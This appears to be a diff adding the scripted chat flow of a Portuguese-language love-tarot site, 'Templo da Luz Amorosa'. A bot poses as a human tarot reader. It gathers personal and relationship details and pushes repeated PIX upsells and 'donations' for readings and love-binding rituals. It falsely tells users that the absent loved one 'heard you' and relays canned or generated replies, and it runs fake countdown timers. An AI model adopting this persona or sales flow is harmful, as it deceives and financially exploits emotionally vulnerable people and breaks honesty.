+        await typeMessage("Nessa leitura, vamos direcionar nossa atenção para *você e para os caminhos que estão à sua frente*, observando tendências e orientações relacionadas a:\n\n❤️ Amor e relacionamentos\n💰 Vida financeira e prosperidade\n🏡 Família e vida pessoal\n✨ Oportunidades e novos caminhos\n⚠️ Pontos que merecem mais atenção", 4000);
+        await typeMessage("Para fazer a sua leitura individualizada, você pode contribuir com a nossa causa para podermos continuar e fazer a sua leitura?");
+        
+        const choice2 = await showButtons([
+            { label: "Sim, quero minha leitura 🔮", value: "sim" },
+            { label: "Não, obrigado", value: "nao", type: "secondary" }
+        ]);
+        
+        if (choice2 === 'sim') {
+            await typeMessage("Ótimo! Acesse o botão abaixo para nos ajudar ainda mais, nós do Templo da Luz te agradecemos muito, isso nos mantem firmes na fé!");
+            await typeMessage("Após a contribuição, é só esperar um pouquinho que vai voltar sozinho aqui para a nossa conversa!");
+            await typeMessage(`<a href="https://checkoutseguro.info/checkout/cmtdd2nsd000r01pvtwp6gm3s?offer=r2aiiue&utm_source=chat_entregavel&utm_campaign=${userData.sessionId}" onclick="trackBlindAnalytics('15_btn_oraculo')" target="_self" style="display: block; background-color: #4B2E83; color: white; text-align: center; padding: 12px; border-radius: 8px; text-decoration: none; font-weight: bold; box-shadow: 0 2px 4px rgba(0,0,0,0.2);">🔮 QUERO MINHA LEITURA</a>`, 1000);
+            
+            step = 102; saveCache();
+            await new Promise(r => setTimeout(r, 10000));
+            await resumeUpsell2();
+        } else if (choice2 === 'ja_paguei') {
+              await typeMessage("Maravilha! Vamos lá: para eu sintonizar com a sua energia amorosa, qual o nome da sua amada (ou amado), vocês já têm relacionamento? A quanto tempo?", 4000);
+              step = 9; enableInput("Sua resposta..."); saveCache(); isBotTyping = false; return;
+          } else {
+            await finalDonation();
+        }
+    }
+
+    function checkoutButton(url, label, color, eventName) {
+        return `<a href="${url}&utm_source=chat_entregavel&utm_campaign=${userData.sessionId}" onclick="trackBlindAnalytics('${eventName}')" target="_self" style="display: block; background-color: ${color}; color: white; text-align: center; padding: 13px; border-radius: 10px; text-decoration: none; font-weight: bold; box-shadow: 0 2px 4px rgba(0,0,0,0.2);">${label}</a>`;
+    }
+
+    function pixButton(amount, label, color, eventName) {
+        return `<button onclick="createChatPix(${amount}, '${eventName}')" style="display: block; width: 100%; border: none; background-color: ${color}; color: white; text-align: center; padding: 13px; border-radius: 10px; text-decoration: none; font-weight: bold; box-shadow: 0 2px 4px rgba(0,0,0,0.2); cursor: pointer;">${label}</button>`;
+    }
+
+    async function createChatPix(amount, eventName) {
+        trackBlindAnalytics(eventName);
+        disableInput();
+        await typeMessage("Estou gerando o PIX seguro dentro do atendimento. Aguarde só um instante...");
+        const packageOverride = {
+            amount: amount,
+            title: packageFromAmount(amount).title,
+            questions: packageFromAmount(amount).questions,
+            oraculo_days: packageFromAmount(amount).days,
+            has_amarracao: packageFromAmount(amount).amarracao,
+            has_videochamada: packageFromAmount(amount).videochamada || false,
+            sessions: packageFromAmount(amount).sessions || 1,
+            description: packageFromAmount(amount).title
+        };
+        try {
+            window.dispatchEvent(new CustomEvent("utmify:checkout", {
+                detail: { currency: "BRL", value: amount, product: "Leitura Amorosa - " + packageOverride.title }
+            }));
+            if (window.fbq) window.fbq("track", "InitiateCheckout", { currency: "BRL", value: amount, content_name: "Leitura Amorosa - " + packageOverride.title });
+            if (window.ttq) window.ttq.track("InitiateCheckout", { currency: "BRL", value: amount, content_name: "Leitura Amorosa - " + packageOverride.title });
+        } catch(e) {}
+        try {
+            const res = await fetch('../create-pix.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    amount: amount,
+                    name: userData.nome || 'Cliente Templo da Luz Amorosa',
+                    phone: '',
+                    ente: userData.ente || '',
+                    letter: 'Complemento liberado dentro do chat: R$ ' + amount,
+                    package_override: packageOverride,
+                    tracking: { utm_source: 'chat_entregavel', utm_campaign: userData.sessionId }
+                })
+            });
+            const data = await res.json();
+            if (!data.ok) throw new Error(data.error || 'Não foi possível gerar o PIX.');
+            await typeMessage(`<div style="text-align:center;"><img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(data.pix_payload)}" alt="QR Code PIX" style="width:220px;max-width:100%;border-radius:10px;background:#fff;padding:8px;"><textarea readonly onclick="this.select()" style="width:100%;height:90px;margin-top:10px;border:1px solid #ddd;border-radius:8px;padding:8px;font-size:11px;">${data.pix_payload}</textarea><p style="font-size:12px;margin-top:6px;">Toque no código para copiar pelo celular. Depois de pagar, volte para esta conversa.</p></div>`, 1000);
+        } catch(e) {
+            await typeMessage("Não consegui gerar o PIX agora. Toque novamente em alguns segundos ou escolha outra liberação.");
+        }
+    }
+
+    async function miniPixOffers() {
+        const pkg = packageFromAmount(userData.packageAmount);
+        await typeMessage("Antes de encerrarmos: quando a leitura abre desse jeito, normalmente ainda ficam pontos que as cartas conseguem esclarecer com mais precisão.");
+        await typeMessage("Posso liberar um complemento dentro do próprio atendimento. O de R$20 abre 3 respostas com leitura de carta, mas o de R$30 é mais vantajoso porque libera 5 respostas, leitura de cartas e 30 dias de oráculo do futuro.");
+
+        trackBlindAnalytics('18_pitch_mini_pix');
+        const choice = await showButtons([
+            { label: "Quero o mais vantajoso: R$30", value: "trinta" },
+            { label: "Prefiro 3 respostas por R$20", value: "vinte", type: "secondary" },
+            { label: "Agora não", value: "nao", type: "secondary" }
+        ]);
+
+        if (choice === 'trinta') {
+            await typeMessage("Boa escolha. O de R$30 é o mais vantajoso porque libera 5 respostas, leitura de cartas e 30 dias de oráculo do futuro.");
+            await typeMessage(pixButton(30, "Gerar PIX de R$30 para 5 respostas + Oráculo 30 dias", "#00a884", "19_btn_extra_30"), 1000);
+        } else if (choice === 'vinte') {
+            await typeMessage("Certo. O de R$20 libera 3 respostas objetivas com leitura de carta amorosa para o ponto que mais aperta seu coração agora.");
+            await typeMessage(pixButton(20, "Gerar PIX de R$20 para 3 respostas + leitura de carta", "#005A9C", "20_btn_extra_20"), 1000);
+            await typeMessage("Sendo sincera: se você puder, o de R$30 compensa mais porque entrega 5 respostas e oráculo de 30 dias, não só 3 respostas.");
+            await typeMessage(pixButton(30, "Melhorar para R$30 com 5 respostas", "#00a884", "21_btn_upgrade_30"), 1000);
+        } else {
+            await typeMessage("Tudo bem. Só vou te mostrar as liberações que ainda podem completar o seu atendimento, porque talvez uma delas faça mais sentido para o que você está vivendo.");
+        }
+
+        if (!pkg.onlyAmarracao && !pkg.amarracao) {
+            await typeMessage("Se o que você sente é que existe afastamento, orgulho ou frieza, o complemento mais forte é a **Amarração Amorosa de 3 a 7 dias**.");
+            await typeMessage(pixButton(40, "Gerar PIX de R$40 para Amarração Amorosa", "#7c2d12", "22_btn_amarracao_40"), 1000);
+        }
+
+        if ((userData.packageAmount || 20) < 30) {
+            await typeMessage("Outra opção é ampliar para a leitura com **5 respostas + leitura de cartas + oráculo amoroso de 30 dias**. Ela mostra o que tende a acontecer depois dessa energia de hoje.");
+            await typeMessage(pixButton(30, "Gerar PIX de R$30 para 5 respostas + Oráculo 30 dias", "#4B2E83", "23_btn_oraculo_30"), 1000);
+        }
+
+        if ((userData.packageAmount || 35) < 60) {
+            await typeMessage("E o mais completo do Templo é para quem quer sair sem dúvida: **tudo incluso: 20 respostas, leitura amorosa, oráculo do futuro e amarração amorosa com consagração de vela**.");
+            await typeMessage(pixButton(60, "Gerar PIX de R$60 para o Pacote Sagrado VIP", "#b45309", "24_btn_completo_60"), 1000);
+        }
+
+        await typeMessage("Vou deixar tudo aqui para você decidir com calma. Se sentir que precisa continuar hoje, toque em uma das liberações acima.");
+        isBotTyping = false;
+        inputArea.style.display = 'none';
+    }
+
+    async function premiumSchedulePitch() {
+        await typeMessage("Você também liberou o atendimento premium: **3 sessões completas** com leitura amorosa, oráculo, amarração e leitura da mão por videochamada no WhatsApp.");
+        await typeMessage("Em cada uma das 3 sessões, você poderá escolher como prosseguir: aprofundar sentimentos, terceira pessoa, volta, silêncio, ciúme, amarração ou próximo passo.");
+        await typeMessage("No momento eu não consigo encaixar a videochamada ainda hoje, porque os horários de hoje já estão fechados. Vamos deixar marcado para o próximo dia disponível.");
+        await typeMessage("Qual dia você fica disponível para a primeira sessão?");
+        step = 30; enableInput("Ex: amanhã, segunda, 12/09..."); saveCache(); isBotTyping = false;
+    }
+
+    async function savePremiumSchedule() {
+        try {
+            await fetch('save-schedule.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    sessionId: userData.sessionId,
+                    nome: userData.nome,
+                    email: userData.email,
+                    ente: userData.ente,
+                    packageAmount: userData.packageAmount,
+                    packageTitle: userData.packageTitle,
+                    day: userData.scheduleDay,
+                    hour: userData.scheduleHour
+                })
+            });
+        } catch(e) {}
+    }
+
+    async function finalDonation() {
+        await typeMessage("O Templo da Luz Amorosa vive de contribuições voluntárias e o valor da nossa conexão muitas vezes não cobre os custos da estrutura, das velas, incensos e do nosso espaço sagrado.");
+        await typeMessage("Você sentiria no seu coração o desejo de fazer uma pequena contribuição para nos ajudar a continuar com essa missão de luz?");
+        
+        trackBlindAnalytics('16_pitch_doacao');
+        const finalAns = await showButtons([
+            { label: "Sim, posso ajudar 🙏", value: "sim" },
+            { label: "Agora não posso", value: "nao", type: "secondary" }
+        ]);
+        if (finalAns === 'sim') {
+            await typeMessage("Gratidão! Para fazer a sua liberação e apoiar o Templo da Luz Amorosa, basta acessar o link abaixo:");
+            await typeMessage(`<a href="https://checkoutseguro.info/checkout/cmtdd2uf4002d01ojvynbqhra?offer=bi9cm5j&utm_source=chat_entregavel&utm_campaign=${userData.sessionId}" onclick="trackBlindAnalytics('17_btn_doacao')" target="_self" style="display: block; background-color: #005A9C; color: white; text-align: center; padding: 12px; border-radius: 8px; text-decoration: none; font-weight: bold; box-shadow: 0 2px 4px rgba(0,0,0,0.2);">🙌 FAZER UMA DOAÇÃO VOLUNTÁRIA</a>`, 1000);
+            step = 200; saveCache();
+            await new Promise(r => setTimeout(r, 10000));
+            await resumeFinalDonation();
+        } else {
+            await typeMessage("Compreendo perfeitamente. Fique na paz! ✨", 2000);
+            isBotTyping = false;
+            inputArea.style.display = 'none';
+        }
+    }
+
+    async function resumeFinalDonation() {
+        awaitPurchaseOrTimeout("boe5z4d_1068315", async () => { 
+            await typeMessage("Muito obrigada pela sua liberação! Que Deus multiplique na sua vida. 🙏✨"); 
+            await typeMessage("Foi uma honra fazer esse atendimento para você hoje. Fique na luz!"); 
+            isBotTyping = false; 
+            inputArea.style.display = 'none';
+        }, async () => { 
+            await typeMessage("Sem problemas, que Deus te abençoe sempre. Fique na luz!"); 
+            isBotTyping = false; 
+            inputArea.style.display = 'none';
+        }, `https://checkoutseguro.info/checkout/cmtdd2uf4002d01ojvynbqhra?offer=bi9cm5j&utm_source=chat_entregavel&utm_campaign=${userData.sessionId}`);
+    }
+
+    
+    async function trackBlindAnalytics(stepName) {
+        try {
+            const data = JSON.stringify({ chatName: 'Chat Entregavel', step: stepName, sessionId: userData.sessionId });
+            if (navigator.sendBeacon) { navigator.sendBeacon('../analytics/api.php', data); }
+            else { fetch('../analytics/api.php', { method: 'POST', body: data }).catch(() => {}); }
+        } catch(e) {}
+    }
+
+    function sendPresenceHeartbeat() {
+        try {
+            const data = JSON.stringify({ chatName: 'Chat Entregavel', step: 'online', sessionId: userData.sessionId, eventType: 'heartbeat' });
+            if (navigator.sendBeacon) { navigator.sendBeacon('../analytics/api.php', data); }
+            else { fetch('../analytics/api.php', { method: 'POST', body: data }).catch(() => {}); }
+        } catch(e) {}
+    }
+
+    let presenceHeartbeatInterval = null;
+    function startPresenceHeartbeat() {
+        if (presenceHeartbeatInterval) return;
+        sendPresenceHeartbeat();
+        presenceHeartbeatInterval = setInterval(sendPresenceHeartbeat, 10000);
+    }
+
+    async function runBotSequence(stepIndex, userText) {
+        isBotTyping = true;
+        disableInput();
+        
+        if (stepIndex === 0) {
+            trackBlindAnalytics('1_iniciou');
+            const pkg = await hydratePackageFromPurchase();
+            await typeMessage("Olá! Aqui é a taróloga Milena Medeiros. Recebi a confirmação da sua liberação para o pacote: **" + pkg.title + "**. Vamos seguir seu atendimento amoroso por aqui.");
+            await typeMessage("Para eu conseguir sintonizar perfeitamente e não haver erros na carta, peço que a partir de agora você responda **somente** ao que eu perguntar de forma direta e curta, tudo bem?");
+            step = 15; enableInput("Sua resposta..."); saveCache();
+        }
+
+        else if (stepIndex === 1) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(userText.trim())) {
+                userData.emailFails = (userData.emailFails || 0) + 1;
+                saveCache();
+                if (userData.emailFails >= 3) {
+                    await typeMessage("Parece que não estou conseguindo localizar sua ficha. Aqui você consegue fazer a contribuição para seguirmos com sua cartinha:");
+                    await typeMessage(`<a href="https://checkoutseguro.info/checkout/cmtdcckff00jl01pz4lh2h5bv?offer=HIM5PQ9&utm_source=chat" target="_self" style="display: block; background-color: #00a884; color: white; text-align: center; padding: 12px; border-radius: 8px; text-decoration: none; font-weight: bold; margin-top: 5px; box-shadow: 0 2px 4px rgba(0,0,0,0.2);">🟢 Fazer Contribuição</a>`, 1000);
+                    userData.emailFails = 0; saveCache();
+                } else {
+                    await typeMessage("Tem certeza que o e-mail foi escrito corretamente? Por favor, digite novamente (ex: seuemail@gmail.com):");
+                }
+                enableInput("Seu e-mail..."); 
+                return true;
+            }
+            userData.email = userText.trim();
+            
+            showTyping();
+            let boughtMain = true; // bypassed
+            hideTyping();
+            
+            if (!boughtMain) {
+                userData.emailFails = (userData.emailFails || 0) + 1;
+                saveCache();
+                if (userData.emailFails >= 3) {
+                    await typeMessage("Parece que não estou conseguindo localizar sua ficha no nosso sistema. Caso não tenha pago ainda, aqui você consegue fazer a contribuição para começarmos:");
+                    await typeMessage(`<a href="https://checkoutseguro.info/checkout/cmtdcckff00jl01pz4lh2h5bv?offer=HIM5PQ9&utm_source=chat_entregavel&utm_campaign=${userData.sessionId}" target="_self" style="display: block; background-color: #00a884; color: white; text-align: center; padding: 12px; border-radius: 8px; text-decoration: none; font-weight: bold; margin-top: 5px; box-shadow: 0 2px 4px rgba(0,0,0,0.2);">💳 Fazer Contribuição</a>`, 1000);
+                    userData.emailFails = 0; saveCache();
+                } else {
+                    await typeMessage("Não encontrei nenhum pedido pago com esse e-mail no nosso sistema. Tem certeza que usou esse e-mail na compra? Por favor, digite novamente:");
+                }
+                enableInput("Seu e-mail..."); 
+                return true;
+            }
+
+            trackBlindAnalytics('2_pediu_nome');
+            
+            await typeMessage("Para eu conseguir sintonizar perfeitamente e não haver erros na carta, peço que a partir de agora você responda **somente** ao que eu perguntar de forma direta e curta, tudo bem?");
+            await typeMessage("Primeiro, me escreva apenas o seu nome completo:");
+            step = 2; enableInput("Seu nome..."); saveCache();
+        }
+        else if (stepIndex === 15) {
+            await typeMessage("Ótimo! Primeiro, me escreva apenas o seu nome completo:");
+            step = 2; enableInput("Seu nome..."); saveCache();
+        }
+        else if (stepIndex === 2) {
+            trackBlindAnalytics('3_pediu_afastamento');
+            userData.nome = userText;
+            await typeMessage(`Obrigada, ${userData.nome}. Agora preciso saber: vocês estão juntos, afastados, terminados ou em dúvida sobre uma terceira pessoa?`);
+            step = 3; enableInput("Situação de vocês..."); saveCache();
+        }
+        else if (stepIndex === 3) {
+            trackBlindAnalytics('4_pediu_nome_ente');
+            userData.afastamento = userText;
+            await typeMessage("Agora me diga o nome da pessoa amada para eu firmar a conexão nas cartas:");
+            step = 4; enableInput("Nome da pessoa amada..."); saveCache();
+        }
+        else if (stepIndex === 4) {
+            trackBlindAnalytics('5_pediu_parentesco');
+            userData.ente = userText;
+            await typeMessage("Certo. Qual é a relação de vocês hoje? Ex: ex, ficante, marido/esposa, namorado(a), ou alguém que você deseja trazer de volta.");
+            step = 5; enableInput("Relação atual..."); saveCache();
+        }
+        else if (stepIndex === 5) {
+            trackBlindAnalytics('6_pediu_mensagem');
+            userData.parentesco = userText;
+            const pkg = packageFromAmount(userData.packageAmount);
+            if (pkg.onlyAmarracao) {
+                await typeMessage("Perfeito. Como você liberou a **Amarração Amorosa**, não vou abrir perguntas agora. Vou preparar a firmeza de aproximação de 3 a 7 dias para você e " + userData.ente + ".");
+                await typeMessage("Me diga em uma frase: o que você quer que aconteça entre vocês nos próximos dias?");
+                step = 21; enableInput("Seu desejo para a amarração..."); saveCache(); isBotTyping = false; return true;
+            }
+            const limit = userData.questionLimit || packageFromAmount(userData.packageAmount).questions;
+            userData.perguntas = [];
+            userData.respostas = [];
+            await typeMessage(`Agora vamos para suas perguntas. Você tem direito a ${limit} perguntas. Envie a primeira pergunta amorosa que você quer ver nas cartas.`);
+            step = 20; enableInput("Digite sua 1ª pergunta..."); saveCache();
+            isBotTyping = false;
+            return true;
+        }
+        else if (stepIndex === 20) {
+            const limit = userData.questionLimit || packageFromAmount(userData.packageAmount).questions;
+            userData.perguntas = userData.perguntas || [];
+            userData.respostas = userData.respostas || [];
+            userData.perguntas.push(userText);
+            showTyping();
+            let resposta = "";
+            try {
+                const res = await fetch('api_resposta.php', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(Object.assign({}, userData, { mensagem_upsell: userText })) });
+                const data = await res.json();
+                resposta = data.resposta || "As cartas mostram movimento emocional, mas ainda com resistência. Essa pergunta precisa ser observada com calma na leitura principal.";
+            } catch (e) { resposta = "As cartas mostram movimento emocional, mas ainda com resistência. Essa pergunta precisa ser observada com calma na leitura principal."; }
+            hideTyping();
+            userData.respostas.push(resposta);
+            await typeMessage(resposta, 1000);
+            if (userData.perguntas.length < limit) {
+                const next = userData.perguntas.length + 1;
+                await typeMessage(`Vou abrir mais uma lâmina para confirmar essa energia. Envie agora a pergunta ${next} de ${limit}.`);
+                step = 20; enableInput(`Digite sua ${next}ª pergunta...`); saveCache(); isBotTyping = false; return true;
+            }
+            await typeMessage("Fechei suas perguntas principais. Agora vou abrir a leitura central do amor para enxergar o campo completo entre você e " + userData.ente + ".");
+            userData.mensagem = (userData.perguntas || []).join(' | ');
+            inputArea.style.display = 'none'; saveCache();
+            userData.deliverTime = Date.now() + (1 * 60000); userData.fakedTimer = 0;
+            step = 7; saveCache(); startLetterTimer(); isBotTyping = false;
+            return true;
+        }
+        else if (stepIndex === 21) {
+            userData.mensagem = userText;
+            inputArea.style.display = 'none'; saveCache();
+            await typeMessage("Recebi. A energia entre vocês mostra laço, resistência e orgulho, por isso a amarração precisa ser feita com calma e firmeza.");
+            await typeMessage("Aqui estão os **3 passos do amor** para a amarração de 3 a 7 dias:\n\n1. **Limpeza do medo:** hoje, antes de dormir, respire fundo por 7 vezes e solte a ansiedade. Não chame essa pessoa pela dor, chame pela lembrança boa.\n\n2. **Chamada do pensamento:** pense no rosto de " + userData.ente + " e repita o nome da pessoa 3 vezes, mentalizando aproximação, conversa e abertura emocional.\n\n3. **Firmeza de aproximação:** por 3 a 7 dias, evite cobrança, indireta ou desespero. Observe sinais, sonhos, vontade repentina de mandar mensagem e mudanças pequenas. A energia precisa de silêncio para se mover.");
+            await typeMessage("Minha orientação: não quebre essa firmeza com ansiedade. Se mexer demais, você espalha a energia. Faça simples, mas faça com intenção.");
+            trackBlindAnalytics('10_entrega_amarracao_40');
+            await miniPixOffers();
+            return true;
+        }
+        else if (stepIndex === 30) {
+            userData.scheduleDay = userText;
+            await typeMessage("Perfeito. Para esse dia eu vou verificar o encaixe da primeira sessão premium.");
+            await typeMessage("Agora me diga qual horário fica melhor para você. Pode mandar uma faixa, por exemplo: 14h, depois das 18h, ou entre 20h e 21h.");
+            step = 31; enableInput("Horário disponível..."); saveCache(); isBotTyping = false; return true;
+        }
+        else if (stepIndex === 31) {
+            userData.scheduleHour = userText;
+            await savePremiumSchedule();
+            await typeMessage("Combinado. Anotei sua preferência para **" + userData.scheduleDay + " às " + userData.scheduleHour + "**.");
+            await typeMessage("A primeira sessão será a leitura da mão por videochamada e abertura do campo amoroso. Depois disso, nas outras 2 sessões, você escolhe comigo se quer aprofundar amarração, retorno, terceira pessoa ou próximos passos.");
+            await typeMessage("Vou deixar esse registro salvo no sistema do atendimento. Fique atenta ao WhatsApp informado na compra para a confirmação do encaixe.");
+            await miniPixOffers();
+            return true;
+        }
+        else if (stepIndex === 6) {
+            trackBlindAnalytics('7_ofereceu_fura_fila');
+            userData.mensagem = userText;
+            inputArea.style.display = 'none'; saveCache();
+            await typeMessage("Entendi, " + userData.nome + ". A sua energia está muito presa nessa pessoa, e isso precisa ser visto com seriedade agora.");
+            await typeMessage(`Perfeito. Estou sintonizando a minha energia com a luz do(a) ${userData.ente} neste exato momento...`);
+            await typeMessage("Vou abrir sua leitura agora, sem fila. Aguarde enquanto eu puxo as cartas principais do amor.");
+            userData.deliverTime = Date.now() + (1 * 60000); userData.fakedTimer = 0;
+            step = 7; saveCache(); startLetterTimer(); isBotTyping = false;
+        }
+        else if (stepIndex === 8) {
+            userData.mensagem_upsell = userText;
+            inputArea.style.display = 'none';
+            saveCache();
+            
+            await typeMessage("Transmitindo as suas palavras para o campo amoroso neste exato momento... ✨");
+            showTyping();
+            
+            let respostaContent = "";
+            try {
+                const res = await fetch('api_resposta.php', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(userData) });
+                const data = await res.json();
+                respostaContent = data.resposta || "Senti uma energia de muita paz, ele(a) recebeu suas palavras com amor.";
+            } catch (e) { respostaContent = "A mensagem foi entregue e recebida com muita paz e luz."; }
+            
+            hideTyping();
+            
+            await typeMessage(`Pronto! O(a) ${userData.ente} ouviu você e conseguiu me passar essa resposta agora mesmo:`);
+            await typeMessage(respostaContent);
+            await typeMessage("Agradeço de coração por me permitir ser a ponte de luz entre vocês. 🙏");
+            
+            await novaCartaPitch();
+        }
+        else if (stepIndex === 9) {
+            userData.oraculo_amor = userText;
+            await typeMessage("Certo, captei esse medo. Agora me diga: o que você mais deseja que aconteça entre vocês nos próximos dias?", 3500);
+            step = 10; enableInput("Seu desejo para a relação..."); saveCache(); isBotTyping = false;
+        }
+        else if (stepIndex === 10) {
+            userData.oraculo_financas = userText;
+            await typeMessage("Entendi. Por último, qual sinal você mais precisa entender: afastamento, frieza, outra pessoa, silêncio, ciúme ou volta?", 3500);
+            step = 11; enableInput("Sinal principal..."); saveCache(); isBotTyping = false;
+        }
+        else if (stepIndex === 11) {
+            userData.oraculo_familia = userText;
+            inputArea.style.display = 'none'; saveCache();
+
+            await typeMessage("Gratidão. Estou abrindo o seu campo amoroso agora. Aguarde um instante enquanto o oráculo dos seus próximos " + (userData.oraculoDays || 90) + " dias é revelado para você...", 4000);
+            showTyping();
+            
+            let oraculoContent = await fetchOraculo();
+            hideTyping();
+            
+            await typeMessage(oraculoContent, 1000);
+            if (userData.hasAmarracao) {
+                await typeMessage("Como o seu pacote inclui a amarração amorosa de 3 a 7 dias, vou deixar também os 3 passos do amor para você iniciar hoje com firmeza e respeito espiritual.");
+                await typeMessage("1. **Limpeza do medo:** antes de dormir, respire fundo por 7 vezes e diga mentalmente: eu solto a ansiedade e permito que a verdade apareça.\n\n2. **Chamada do pensamento:** pense no rosto de " + userData.ente + " por alguns segundos e repita o nome da pessoa com calma, sem raiva, pedindo aproximação com clareza.\n\n3. **Firmeza de aproximação:** pelos próximos 3 a 7 dias, evite cobrança direta. Observe sinais, sonhos, mensagens indiretas e mudanças de comportamento. A energia precisa de silêncio para se mover.");
+            }
+            if (userData.hasVideochamada) {
+                await premiumSchedulePitch();
+                return;
+            }
+            await miniPixOffers();
+        }
+        
+        if (stepIndex !== 6 && stepIndex !== 7 && stepIndex !== 8 && stepIndex !== 9 && stepIndex !== 10 && stepIndex !== 11) {
+            isBotTyping = false;
+        }
+    }
+
+    function sendMessage() {
+        if (isBotTyping) return;
+        const text = messageInput.value.trim();
+        if (text === '') return;
+        addMessage(text, 'sent');
+        messageInput.value = '';
+        disableInput();
+        runBotSequence(step, text);
+    }
+
+    function handleKeyPress(e) { if (e.key === 'Enter') sendMessage(); }
+
+    window.onload = () => {
+        if (!loadCache()) {
+            setTimeout(() => { runBotSequence(0, ''); }, 800);
+        }
+        startPresenceHeartbeat();
+    };
+
+
+
+
+
+
+
+</script>
+<script src="../analytics/tracker.js?v=20260911"></script></body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
